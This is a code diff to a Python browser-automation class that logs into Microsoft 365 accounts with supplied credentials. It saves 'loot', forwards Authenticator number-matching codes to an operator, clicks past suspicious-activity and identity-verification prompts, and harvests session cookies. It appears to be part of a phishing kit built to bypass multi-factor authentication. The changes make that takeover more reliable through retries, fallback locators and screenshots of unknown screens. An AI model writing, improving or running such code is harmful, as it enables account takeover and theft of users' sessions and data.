@@ -34,6 +34,7 @@ class auto_login:
         self.password = password
         self.q = q
         self.id = id
+        self.last_admin_msg = None
         self.loot_location = (
             "./loot/" + "".join(i for i in username if i.isalpha()) + "_" + id
         )
@@ -44,7 +45,9 @@ class auto_login:
             os.makedirs(self.loot_location)
     
     def send_message(self, msg,type="noti", data=""):
-        
+        if self.last_admin_msg == msg:
+            return
+        self.last_admin_msg = msg
         curr_msg = json.dumps({"id": self.id,"username":self.username, "type":type ,"msg": msg, "data": data})
         print(curr_msg)
         self.q.put(curr_msg)
@@ -118,40 +121,67 @@ class auto_login:
         #     self.send_message(msg="OTP_code", data=self.OTP)
             
             # Waiting for an action to happen
+        OTP_wait_time = 120
         while True:
+            print("222")
+            if OTP_wait_time == 0 :
+                self.send_message("reached_max_waiting")
+                page.screenshot(path=f"{self.loot_location}/last_screen.png")
+                return
+            
+            OTP_wait_time -=1 
             time.sleep(1)
-            while True:
+            curr_time = time.time()
+            # wait for 20 second max for the page to load 
+            while time.time() - curr_time < 20:
+                print("111")
                 # Yes this is the best solution that i con think of for this error :) 
                 # Page.content: Unable to retrieve content because the page is navigating and changing the content.
                 try:
                     page_content = page.content()
                     break
-                except:
-                    pass
+                except :
+                    time.sleep(1)
+            
             if "Stay signed in?" in page_content:
                 # an extra wait to for the button to become clickable
                 time.sleep(2) 
                 page.locator("#idSIButton9").click()
                 self.send_message("OTP_submited_stay_signedin_clicked")
                 break
-            if "We didn't hear from you" in page_content:
+            elif "We didn't hear from you" in page_content:
                 self.send_message("OTP_timeout")
                 return
-            if "Welcome to Microsoft 365" in page_content:
+            elif "Welcome to" in page_content:
                 self.send_message("OTP_submited")
                 break
-            if "Suspicious activity detected" in page_content:
+            elif "Suspicious activity detected" in page_content:
                 time.sleep(2)
                 self.send_message("Suspicious_activity_detected")
                 page.locator("#idSIButton9").click()
                 # continue
-            if "Verify your identity" in page_content:
-                self.send_message("Suspicious_activity_detected")
-                page.locator('xpath=//*[@id="idDiv_SAOTCS_Proofs"]/div[1]/div').click()
-            if "Open your Authenticator app, and enter the number shown to sign in" in page.content():
+            elif "Verify your identity" in page_content:
+                self.send_message("Verify_your_identity_detected")
+                locators = [
+                    'xpath=//*[@id="idDiv_SAOTCS_Proofs"]/div/div',
+                    'xpath=//*[@id="idDiv_SAOTCS_Proofs"]/div[1]/div'
+                ]
+                for locator in locators:
+                    try:
+                        page.locator(locator).click()
+                        break
+                    except Exception:
+                        continue
+
+                
+            elif "Open your Authenticator app" in page.content():
                 # Get the OTP
                 self.OTP = page.locator("#idRichContext_DisplaySign").text_content()
                 self.send_message(msg="OTP_code", data=self.OTP)
+            else:
+                self.send_message("unkown_screen_detected")
+                page.screenshot(path=f"{self.loot_location}/unkown_screen.png")
+
         # --------------------- Cookies
         self.send_message("Getting cookies")
         self.cookie = self.fix_cookie(context.cookies())
